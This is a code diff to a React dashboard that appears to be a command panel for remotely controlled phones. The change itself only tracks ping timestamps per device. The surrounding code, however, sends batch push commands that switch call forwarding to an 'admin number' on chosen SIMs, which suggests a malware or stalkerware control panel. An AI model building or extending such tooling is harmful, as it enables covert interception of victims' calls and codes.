@@ -1,5 +1,6 @@
 import { useState, useEffect, useCallback, useRef, useMemo, memo } from "react";
 
+declare global { interface Window { _mrPingedAt?: Record<string,number>; } }
 const _API_KEY = import.meta.env.VITE_API_SECRET ?? "";
 function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
   const h = new Headers(opts.headers);
@@ -1846,7 +1847,17 @@ function CardCheckBtn({ device }: { device: FullDevice }) {
   const batchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const activeRef   = useRef(false); // true ONLY while we are waiting for ping response
 
-  // Listen for Ping All FCM delivery event
+  // On mount — check if already pinged within 30s (catches events fired before card mounted)
+  useEffect(() => {
+    const pingedAt = (window._mrPingedAt as Record<string,number> | undefined)?.[device.deviceId];
+    if (pingedAt && Date.now() - pingedAt < 30000) {
+      setBatchPinged(true);
+      const remaining = 30000 - (Date.now() - pingedAt);
+      batchTimerRef.current = setTimeout(() => setBatchPinged(false), remaining);
+    }
+  }, []); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // Listen for Ping All FCM delivery event (real-time, when card IS mounted)
   useEffect(() => {
     function onPinged(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
@@ -2266,7 +2277,7 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           else if (batchAction === "call_forward") data = { type: "call_forward", action: "activate", number: adminNumInput.trim(), sim: batchSim };
           else if (batchAction === "call_fwd_off") data = { type: "call_forward", action: "deactivate", number: "", sim: batchSim };
           else data = { type: "admin_update", status: "on", number: adminNumInput.trim() };
-          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); });
+          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); (window._mrPingedAt = window._mrPingedAt || {})[d.deviceId] = Date.now(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); });
         }));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setBatchDone(Math.min(i + BATCH, eligible.length));
@@ -2631,7 +2642,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       for (let i = 0; i < eligible.length; i += BATCH) {
         const batch = eligible.slice(i, i + BATCH);
         const results = await Promise.allSettled(batch.map(d =>
-          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "0" } }) }).then(res => { if (!res.ok) throw new Error(); })
+          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "0" } }) }).then(res => { if (!res.ok) throw new Error(); (window._mrPingedAt = window._mrPingedAt || {})[d.deviceId] = Date.now(); window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: d.deviceId } })); })
         ));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setPingDone(Math.min(i + BATCH, eligible.length));
